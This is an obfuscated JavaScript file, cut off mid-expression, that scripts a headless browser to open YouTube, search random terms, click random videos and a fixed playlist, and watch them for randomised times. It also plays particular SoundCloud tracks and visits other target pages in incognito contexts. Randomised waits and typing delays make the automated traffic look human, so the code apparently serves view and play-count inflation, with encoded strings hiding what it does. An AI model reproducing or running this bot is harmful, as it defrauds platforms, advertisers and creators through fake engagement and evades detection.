function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x7 * 0x88 + 0x118f + -0x1547 * 0x1);
    let h = e[f];
    if (b['zbXRuG'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x3 * 0x577 + 0xae3 + 0x582, s, t, u = -0x4 * 0x9bb + -0x3 * 0x5ff + -0x359 * -0x11; t = n['charAt'](u++); ~t && (s = r % (0x5e * 0x1 + 0x76a + -0x7c4) ? s * (-0x220a + -0x2f * -0x69 + 0xf03) + t : t, r++ % (0xcfb + 0x1 * -0xf0d + -0x3 * -0xb2)) ? p += String['fromCharCode'](-0x1 * 0x2305 + -0x47 * -0x87 + -0x16d * 0x1 & s >> (-(-0x2181 + -0x28c * -0xc + 0x2f3) * r & 0x1 * 0x748 + -0x12c3 * 0x1 + 0xb81)) : 0x2 * -0x6e6 + 0x123b + -0x46f) {
          t = o['indexOf'](t);
        }
        for (let v = -0x1849 * -0x1 + 0x216c + -0x39b5, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x11a7 * 0x1 + 0x7b * 0x2f + 0xb2 * -0x7))['slice'](-(0xb29 * -0x1 + -0x1 * -0x2449 + -0x506 * 0x5));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x319 * -0xa + -0xec * -0x3 + -0x21be,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x11 * -0xdb + -0x245d + 0x1 * 0x15d2; u < 0x2 * 0x5c1 + 0xe * 0xcf + 0x16 * -0xfe; u++) {
          p[u] = u;
        }
        for (u = -0x552 + -0x19da + 0x1f2c; u < 0x190 * 0x2 + 0x1 * -0x805 + 0x3 * 0x1f7; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x1 * 0x1212 + -0xe8d + -0x285), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x1864 + 0x1e19 * -0x1 + 0x5b5, q = 0x193 + 0xa * -0x2f2 + -0x1 * -0x1be1;
        for (let v = -0xde * 0x1d + 0x3a2 * -0x1 + -0xe64 * -0x2; v < n['length']; v++) {
          u = (u + (0x145f + -0xf43 * 0x1 + 0x51b * -0x1)) % (-0xe3c + 0x2255 + 0x1 * -0x1319), q = (q + p[u]) % (0xd27 * 0x1 + 0x293 * 0xd + 0x2d9e * -0x1), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x1 * 0x6f + 0x21a5 + -0x3a * 0x92)]);
        }
        return t;
      };
      b['KZtnKs'] = m, c = arguments, b['zbXRuG'] = !![];
    }
    const j = e[0x838 + 0xd8a * 0x1 + -0x15c2],
      k = f + j,
      l = c[k];
    return !l ? (b['snbHty'] === undefined && (b['snbHty'] = !![]), h = b['KZtnKs'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
const V = c,
  U = b,
  T = d;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x715 + 0x7 * 0x16c + 0x2de * -0x1))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x61d + -0x1 * 0x10ed + -0x6 * -0x3d7), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x7 * 0x88 + 0x118f + -0x1547 * 0x1);
    let h = e[f];
    if (c['BXyLsO'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x3 * 0x577 + 0xae3 + 0x582, r, s, t = -0x4 * 0x9bb + -0x3 * 0x5ff + -0x359 * -0x11; s = m['charAt'](t++); ~s && (r = q % (0x5e * 0x1 + 0x76a + -0x7c4) ? r * (-0x220a + -0x2f * -0x69 + 0xf03) + s : s, q++ % (0xcfb + 0x1 * -0xf0d + -0x3 * -0xb2)) ? o += String['fromCharCode'](-0x1 * 0x2305 + -0x47 * -0x87 + -0x16d * 0x1 & r >> (-(-0x2181 + -0x28c * -0xc + 0x2f3) * q & 0x1 * 0x748 + -0x12c3 * 0x1 + 0xb81)) : 0x2 * -0x6e6 + 0x123b + -0x46f) {
          s = n['indexOf'](s);
        }
        for (let u = -0x1849 * -0x1 + 0x216c + -0x39b5, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x11a7 * 0x1 + 0x7b * 0x2f + 0xb2 * -0x7))['slice'](-(0xb29 * -0x1 + -0x1 * -0x2449 + -0x506 * 0x5));
        }
        return decodeURIComponent(p);
      };
      c['bNnPMH'] = i, b = arguments, c['BXyLsO'] = !![];
    }
    const j = e[-0x319 * -0xa + -0xec * -0x3 + -0x21be],
      k = f + j,
      l = b[k];
    return !l ? (h = c['bNnPMH'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function standardGoto(f, h, i) {
  const R = c;
  return await f[R(0x11)](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x1819 + 0x4de0 + 0x3 * 0x1523 + (0x2ef6 + 0xd8d * -0x3 + 0x3449) * random()) : await standardWaitForNetIdle(f), await wait(-0x159 * -0x5 + -0x11fb + -0xd * -0x25e + (0x185 + -0x10 * 0x35b + 0x3 * 0x1e69) * random()), 0xf2c + -0x237a + 0x144f * 0x1;
}
async function standardWaitForNetIdle(f) {
  return await wait(0xbcd + 0x426 * -0x3 + -0x142d * -0x1), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x21f2 + 0x18d * -0x8 + 0x2e5b;
}
async function randomWait() {
  return await wait(0x5d5 * 0x5 + 0x1743 + 0x1a5 * -0x14 + (0x1a6d + -0x1df * -0x7 + 0x1 * -0x13fe) * random()), -0xff * -0x9 + -0x1f18 + -0x1622 * -0x1;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0xb35 + 0x1 * -0xa5e + 0x5 * -0x2b, 0x5 * 0x343 + 0x8 * 0xe9 + -0x1790), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x13630 + -0x1293c + -0xa * -0x542e) * getRandomInt(0x47 * 0x56 + 0x15 * 0x1af + -0x7 * 0x875, 0x1bc + 0x1cc + -0x383 * 0x1), h)), -0x388 * 0xb + -0xf6d * -0x2 + 0x7ff;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x1 * -0x15c2 + 0x7fe + -0x1dc0;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x1b0 * 0x1 + -0x1c3f * 0x1 + -0x28 * -0xaa]['split']('\x20');
    for (let k = -0x12a5 + 0x22c3 * 0x1 + -0x101e; k < i['length']; k += 0x2255 + 0x13 * -0x9d + 0x16ac * -0x1)
      j += i[k] * h[i[k + (0x139 * 0x4 + 0x25ca * 0x1 + 0x889 * -0x5)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x11da + -0x19 * -0x37 + 0x1 * -0x1733)['map'](l => Array['from'](l['children']))['flat'](-0x23 * 0x97 + 0x2 * 0x11ea + 0x2 * -0x797)['map'](l => l['childNodes'][0x185e + 0xa44 + -0x2d * 0xc5]['childNodes'][0xf81 + 0x3 * 0xbdf + -0x331e]['childNodes'][-0x1d91 + -0x1b09 + 0x389b]['childNodes'][-0x1 * -0xcbc + 0x3b * -0x39 + 0x1 * 0x67]['childNodes'][0x21cd + 0x14 * -0x13f + -0x8e0]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x322 * 0x9 + 0x1eef * -0x1 + -0x63 * -0xa3, 0xff6 + 0x1 * -0x1ac + 0x3d * 0x16)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x6c2b + -0x1 * -0x2507 + 0x3 * -0x1cde);
  const h = await getMaxTime(f),
    i = Math['min']((-0x5332 + 0x1bc4 + 0x1cfb * 0xa) * getRandomInt(0x5ef * 0x3 + 0xcbb * 0x3 + 0xdff * -0x4, 0x786 + -0xd26 + 0x5a5), h);
  return await wait(i), -0x55f + -0x1c9e + -0x1ca * -0x13;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x1 * -0x1271 + -0xa * 0x10c + 0x9a3 * 0x3]['children'][-0x151 * -0x1d + -0xd39 + -0x2 * 0xc7a]['children'][0x29d * 0xd + -0x1ab3 + -0x746]['children'][0x61b * 0x3 + -0x19b9 + 0x768]['children'][-0x14df + 0x26c3 + -0x11e4]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x6 * -0x444 + -0x1 * 0x1cf + -0x1 * 0x17c8;
}

function a() {
  const bj = [
    'l0jSB2DNzxjWzq',
    'zgLNAxrHBgDPCG',
    'Ahr0Chm6lY9NCG',
    'random',
    'DCojWRvgW58YWQyLW4b1',
    'pedcQCodWO3cNmo+CWW6',
    'pts/by-sit',
    'cripts/302',
    'y2f0y2G',
    'l2XHAwrIywnRDa',
    'hwzki2yXjSouW7ddLq',
    'moomoo.io\x20',
    'rket-1b665',
    'B3v0DwjLlwfKza',
    'y3jPChqTzM9Ylq',
    'WRFcQx89DSont8oyc8kF',
    'y29Tp3bHz2u9oq',
    'z290BW',
    'yung\x20bts,j',
    'Ahr0Chm6lY9Tzq',
    'zwfJDc1KzxzLBa'
  ];
  a = function() {
    return bj;
  };
  return a();
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0xdb * -0xa + -0x5 * 0x5d2 + -0x1306 * -0x2 + (-0x26bb + -0x2 * -0x683 + -0x19e7 * -0x1) * random()
  }), await wait(-0x1bb5 + 0x6a7 + -0x49a * -0x5 + (-0x3c1 * -0x7 + -0x26c7 * 0x1 + 0xdac) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x17f0 * -0x1 + 0x127f + -0x2a6d]['childNodes'][-0x1d1e + -0x1dba + 0x28f * 0x17]['childNodes'][-0x13ea + -0x1a69 + 0x1 * 0x2e54]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x19f3 + -0x199b + -0x53 * 0x1]['childNodes'][0x24d1 + -0x2582 * -0x1 + -0x4a53]['childNodes'][0x17ba + 0x763 + 0x1 * -0x1f1b]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x1f97 * -0x1 + 0x19 * 0x5c + -0x2892),
          r = -0x260 * -0x2 + -0x6e * -0xe + -0x4 * 0x2b1;
        for (let u = 0x1a * 0x57 + -0x1bec + -0x2ba * -0x7; u < q['length']; u += -0x1 * -0x87e + -0x1e6d * -0x1 + -0x26e9 * 0x1)
          r += q[u] * k[q[u + (0x83d + 0xad7 + -0x13 * 0x101)]];
        return r;
      }(n);
  });
  await wait((-0xb * 0x383 + 0x5181 + 0xfb8) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0xedc6 + 0x1 * 0x16b3b + 0x16ea1 * -0x1) * getRandomInt(-0xc5e + -0xa70 * -0x1 + -0xf * -0x21, 0x5 * -0x331 + 0xbf6 * 0x2 + -0x7ed), h + (0x1a9a + -0x1c6f + -0x1 * -0x155d));
  return await wait(i), 0xf87 + 0x179d * 0x1 + -0x2723;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x7 * 0x88 + 0x118f + -0x1547 * 0x1);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function keyWatch(f) {
  const S = b;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x29a * -0x9 + 0x51 * 0x41 + -0x51 * -0x9), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + S(0xa, 'M8sb') + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x2262 + 0x123 * 0x20 + 0x9ba + (0x1574 + -0x1987 + 0x7fb) * Math['random']());
    });
  }, 0x2fe5 + 0x7 * -0x62f + 0xc2 * 0x1e);
  await wait(0x3a873 + -0xb5b0 + 0x1a11d);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x2 * 0x3739 + -0x9 * -0x18b9 + -0x6293) * getRandomInt(0x2 * 0x9ef + 0x169 + -0x1543, 0x1c9 * 0x9 + 0x11fb + 0x1 * -0x21f3)), clearInterval(h), 0x12b5 + 0x1 * -0x1219 + -0x1 * 0x9b;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x3 * -0xa5b + -0x242b + 0x1 * 0x51a;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x60 * -0x2d + 0x2 * -0x11ff + 0x5 * 0xa93;
    await randomWait();
  }
  return 0x66b * -0x5 + 0x11 * -0x23 + 0x321 * 0xb;
}

function fetchRandomSC() {
  return Math['random']() <= 0x7 * -0x1af + -0x52e + -0x10f7 * -0x1 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x16b * -0x8 + -0x15db + 0xa83 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x1d55 * -0x1 + -0x27c + -0x8f3 * 0x3 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x23a8 + -0x456 * 0x3 + -0x16a6;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x13b2 * 0x1 + 0x5097 * -0x2 + -0xe2 * -0x194 + getRandomInt(0x2c0 * 0x5 + -0x8c5 * 0x4 + 0x4fec, 0x1 * 0xac27 + 0xa * -0x39d + -0x3 * 0x647));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0xa0c + -0x17ea * -0x1 + -0x1 * 0x21f5), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0xf75 + -0x6 * -0x1d + 0xec7 * 0x1;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x1 * 0x6fa + 0xf2f + -0x835, 0x476 + -0x2017 + -0x1 * -0x1bd3)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x1c64 + -0x25c7 + 0x1133 + floor((0xa88 + 0x5a9 + 0xc49 * -0x1) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x97bc2aec + -0x77aaa1d4 * -0x1 + 0xe10e * 0xb614),
          0xa38cf + -0x5417e * -0xe + 0x2c324d,
          -0x7c7e + 0x189f + 0xf31 * 0xf,
          -0x1 * -0xa75 + -0x1 * -0x619 + -0x100e
        ], y = [
          0xc7b + -0xc9d + -0x2 * -0x1d,
          -0x1ad * -0x5 + -0x17 * -0x71 + -0x314 * 0x6,
          -0x1 * 0x1f22 + 0x1 * -0xe14 + 0x2d3e,
          0x968 + 0x55e + 0xec6 * -0x1
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0xffc + 0x1 * -0x25ae + 0x15b3)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x1f3c * -0x1 + 0x898 + -0x27d4; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x1066 + -0x377 * -0x7 + -0x7db) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x233b + -0x5d7 + 0x9cc * -0x3] = A[-0xb3 * 0x1 + -0x1dd7 + 0x1e9a] = A[0x1ad0 + -0x2208 + 0x739] = A[0xd * 0x1b3 + -0xcd2 + -0x943] = A[-0x3fd * 0x1 + 0x1 * 0x35b + 0xf * 0xb] = A[0x256f + 0x2 * 0xa1f + -0x39a9] = A[0x1 * 0xd47 + 0x24d * -0x10 + 0x4b6 * 0x5] = A[-0x75 + -0x1 * 0x11a1 + -0x90e * -0x2] = A[0x1 * -0x181d + -0x6d * 0x1 + 0x14b * 0x13] = A[0x2d7 * -0x8 + 0x57 * 0x43 + 0x1 * -0x5] = A[0x1 * 0x7c0 + -0x5db + -0x1dc] = A[-0x6de + -0x1948 + -0xce * -0x28] = A[-0xd * -0x2c3 + -0x247a + 0x9e * 0x1] = A[-0xc4 + -0x1f4 * -0x4 + -0x700] = A[0x25b7 + -0x60a * -0x1 + -0xaed * 0x4] = A[-0x1b1e + 0x1a48 + 0xe4] = A[0x1199 + -0x629 * 0x6 + 0x2c * 0x71] = 0xa15 * -0x1 + 0x1438 + 0xad * -0xf, this['blocks'] = A) : this['blocks'] = [
                0xe7d * -0x2 + -0x14d2 + 0x31cc,
                -0xd87 * -0x1 + -0x1 * -0x492 + -0x1219 * 0x1,
                0x946 + 0x610 + -0x1 * 0xf56,
                -0x9a5 * -0x3 + -0x9f * 0xf + -0x139e,
                -0x1ad2 + 0x1783 + -0x4d * -0xb,
                0x1 * -0x853 + 0x1 * 0x204e + -0x17fb,
                -0x26f5 + 0xeb5 + 0x1840,
                0xdb4 * 0x1 + 0x1 * 0x752 + -0x381 * 0x6,
                -0xf9e + 0x10e8 + -0x14a,
                0xdb0 + 0x1 * -0x274 + -0xb3c,
                0x12 * -0x1fc + -0x65 * -0x21 + 0x16b3 * 0x1,
                0x1a1 + -0x2647 + 0x24a6,
                0x1031 + 0x2515 + -0x8e1 * 0x6,
                0x2699 + 0x2b * 0x97 + -0x3ff6,
                -0x46e + 0x1cd8 + -0x186a,
                -0xd * -0x166 + 0x1109 + -0x259 * 0xf,
                0x18f * 0x6 + -0xb71 + 0x217
              ], this['h0'] = 0x6cca878f + 0x3ca55 * -0x35ae + -0x2796bed8 * -0x5, this['h1'] = 0x10b457 * -0x1729 + 0x97 * -0x2df9342 + 0x4248e3a66, this['h2'] = 0xbb3 * -0x16e5d1 + 0x2b9a7b44 * -0x4 + -0x253077631 * -0x1, this['h3'] = 0x19555db1 + -0x38a3e78 + -0x598cac3, this['h4'] = 0x128503b94 + -0x10eb66fb7 + 0xaa391613, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x5 * 0x4db + -0x2521 + 0x3 * 0x1478, this['finalized'] = this['hashed'] = -0xa * -0x1bb + -0x2598 + 0x62 * 0x35, this['first'] = 0xf36 + 0x657 * -0x1 + 0xa * -0xe3;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x485 * -0x1 + 0x510 + 0x1 * -0x995, O = J['length'] || 0x14cb + 0xaf * 0x1f + -0xa7f * 0x4, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x258a + 0x3d5 * 0x3 + -0x71 * -0x3b, P[0xd29 + -0x2370 + 0x1647 * 0x1] = this['block'], P[-0x2378 + -0x1caf + 0x4037] = P[-0x1 * 0x44f + 0xecc * 0x2 + 0x1 * -0x1948] = P[0x157a + 0xa * 0xc2 + -0x1d0c] = P[0x6 * -0x20f + -0xe30 * -0x1 + -0x1d3] = P[0x2480 + 0x4 * -0x257 + -0x1b20] = P[-0xb * -0x1ed + 0x684 + -0x1bae] = P[0x1 * 0x566 + 0x1bdb + 0x1 * -0x213b] = P[-0x2 * 0x38 + -0x1573 + 0x3 * 0x74e] = P[-0x391 * -0x1 + -0x1 * 0x1650 + -0x13 * -0xfd] = P[0x1a * -0x117 + -0x5b * -0x3 + 0x1b4e] = P[-0x1217 + -0x1cc9 + 0x2 * 0x1775] = P[0x739 * -0x1 + -0x78d * 0x2 + -0xe * -0x199] = P[-0x2fb * 0xb + 0x2 * -0x6bb + 0x2e4b] = P[-0x13d5 + 0x25d2 + 0x10 * -0x11f] = P[-0x7 * -0x161 + 0x4 * 0x4c7 + -0x1cb5 * 0x1] = P[-0x38a + 0x26 * -0xef + -0x1 * -0x2713] = 0x240c + 0xe5b + -0x3267), K) {
                    for (N = this['start']; M < O && N < -0x16e5 + 0x16b8 + 0x6d; ++M)
                      P[N >> 0xdba + 0x62f + -0x13e7] |= J[M] << y[-0x949 + 0x438 + -0x2 * -0x28a & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x2498 * 0x1 + -0x659 + -0x1dff * 0x1; ++M)
                      (L = J['charCodeAt'](M)) < 0x81 * 0x18 + 0x263a + -0x31d2 ? P[N >> 0x2199 + -0x181f + -0x978] |= L << y[0x6c + 0x1fd3 * 0x1 + 0x2 * -0x101e & N++] : L < 0x1fd * 0x12 + 0x16 * -0xeb + -0x798 ? (P[N >> 0x22e1 * -0x1 + 0x24 * 0x61 + 0x153f] |= (0x2 * -0x581 + -0x215d + 0x2d1f | L >> -0x20ad + 0x38f + 0x14 * 0x175) << y[0xb8f + -0x239 + -0xd9 * 0xb & N++], P[N >> -0x3bb * -0x9 + -0x4f * -0x43 + -0x363e] |= (-0x2654 + -0x13b0 + 0x14 * 0x2ed | -0x12cb + 0x1 * -0x1661 + -0x1cd * -0x17 & L) << y[-0x14 * 0x53 + -0x26da + -0x263 * -0x13 & N++]) : L < 0x172e6 + -0x65 * -0x1d3 + -0x44b * 0x4f || L >= -0x15fc6 + 0x18 * -0x113d + 0x1eebf * 0x2 ? (P[N >> -0x740 + -0x13a2 + 0x2 * 0xd72] |= (0x2 * -0xeba + -0x3 * -0x94d + 0x26d | L >> -0xda2 + 0x26c4 + -0x1ee * 0xd) << y[0x16 + -0x381 * 0x2 + 0x6ef & N++], P[N >> -0x1e97 + 0x19ec + 0x4ad] |= (-0xc * -0x1fd + -0x1246 + 0x1 * -0x516 | L >> -0x1 * 0x1edb + -0x1e0 + 0x20c1 & 0x1 * 0x171f + 0x2 * -0x217 + -0x959 * 0x2) << y[0x3 * 0x315 + 0x190d + -0x2249 & N++], P[N >> 0x1 * -0x3b5 + 0x26b9 + 0x2 * -0x1181] |= (0x1614 + 0x3 * -0x95f + 0xef * 0x7 | -0x1076 + 0x15 * 0x1bc + -0x13b7 & L) << y[-0x184f + 0x869 + 0xfe9 & N++]) : (L = -0x1 * 0x10596 + -0x2606 + 0x36e * 0xa2 + ((0x13f2 + 0xdcd * -0x1 + -0x226 * 0x1 & L) << 0x234b + 0x3a * -0x35 + -0x173f | -0x41 * 0x66 + -0x19 * 0x187 + 0x4414 * 0x1 & J['charCodeAt'](++M)), P[N >> 0x886 + 0x792 + -0x1016] |= (-0x1fa5 + 0xa39 * -0x1 + 0x2ace | L >> 0xa06 * 